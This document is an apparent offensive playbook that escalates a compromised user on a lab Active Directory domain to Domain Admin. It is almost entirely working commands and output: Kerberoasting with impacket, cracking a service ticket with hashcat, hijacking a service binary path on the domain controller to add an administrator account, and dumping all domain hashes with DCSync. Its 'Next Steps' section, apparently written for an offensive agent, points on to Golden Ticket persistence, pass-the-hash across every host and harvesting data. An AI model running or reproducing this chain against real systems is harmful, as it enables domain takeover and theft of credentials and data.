# Active Directory Kerberoasting to Domain Admin

## Scenario
Compromised domain user `jsmith` on MEGACORP.LOCAL, targeting Domain Admin.

## Step 1: Enumerate Kerberoastable SPNs
```bash
$ impacket-GetUserSPNs MEGACORP.LOCAL/jsmith:'W1nt3r2025!' -dc-ip 10.10.10.100

ServicePrincipalName                         Name         MemberOf
-------------------------------------------  -----------  -----------------------------------------------
MSSQLSvc/sql01.megacorp.local:1433           svc_sql      CN=Server Operators,CN=Builtin,DC=megacorp,DC=local
HTTP/intranet.megacorp.local                 svc_iis      CN=IT Helpdesk,OU=Groups,DC=megacorp,DC=local

# svc_sql is in Server Operators — can logon to DC!
```

## Step 2: Request TGS Tickets
```bash
$ impacket-GetUserSPNs MEGACORP.LOCAL/jsmith:'W1nt3r2025!' -dc-ip 10.10.10.100 \
  -request -outputfile tgs_hashes.txt

[*] Getting TGS for svc_sql
[*] Getting TGS for svc_iis
[*] Saved 2 hashes to tgs_hashes.txt
```

## Step 3: Crack with Hashcat
```bash
$ hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule -O

$krb5tgs$23$*svc_sql$MEGACORP.LOCAL$...*:Sql@dmin2024!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Speed.#1.........:  1245.2 MH/s (0.97ms) @ Accel:256 Loops:1 Thr:512 Vec:1
Recovered........: 1/2 (50.00%) Digests
```

## Step 4: Validate svc_sql Access
```bash
# svc_sql is Server Operator on DC — can logon and has service control
$ crackmapexec smb 10.10.10.100 -u svc_sql -p 'Sql@dmin2024!' -d MEGACORP.LOCAL
SMB  10.10.10.100  445  DC01  [+] MEGACORP.LOCAL\svc_sql:Sql@dmin2024!

# Check if can PSExec to DC
$ impacket-psexec MEGACORP.LOCAL/svc_sql:'Sql@dmin2024!'@10.10.10.100
[*] Requesting shares on 10.10.10.100.....
[-] share 'ADMIN$' is not writable.

# Server Operators can modify services — abuse for SYSTEM
$ impacket-services MEGACORP.LOCAL/svc_sql:'Sql@dmin2024!'@10.10.10.100 list
```

## Step 5: Abuse Server Operators → SYSTEM on DC
```bash
# Modify an existing service to execute our payload
$ impacket-services MEGACORP.LOCAL/svc_sql:'Sql@dmin2024!'@10.10.10.100 \
  config -name "VSS" -binpath "cmd /c net user hacker P@ssw0rd123! /add && net localgroup Administrators hacker /add"

$ impacket-services MEGACORP.LOCAL/svc_sql:'Sql@dmin2024!'@10.10.10.100 \
  start -name "VSS"

# Now we have a local admin on the DC
$ impacket-psexec MEGACORP.LOCAL/hacker:'P@ssw0rd123!'@10.10.10.100
Microsoft Windows [Version 10.0.17763.5820]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

# DCSync for full domain compromise
$ impacket-secretsdump MEGACORP.LOCAL/hacker:'P@ssw0rd123!'@10.10.10.100 -just-dc-ntlm
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9f3e2d1c0b9a8f7...:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8e4f3d2c1a0b9e8...:::
```

## Attack Chain Summary
```
jsmith (domain user)
  → Kerberoast svc_sql (TGS cracked: Sql@dmin2024!)
    → svc_sql is Server Operator on DC
      → Modify service binary path on DC
        → SYSTEM on DC
          → DCSync all domain hashes
            → Full domain compromise
```

## Next Steps
→ **credential_access skill**: Golden Ticket with krbtgt hash for persistence
→ **lateral_movement skill**: PTH to every host in the domain
→ **collection skill**: Harvest all sensitive data
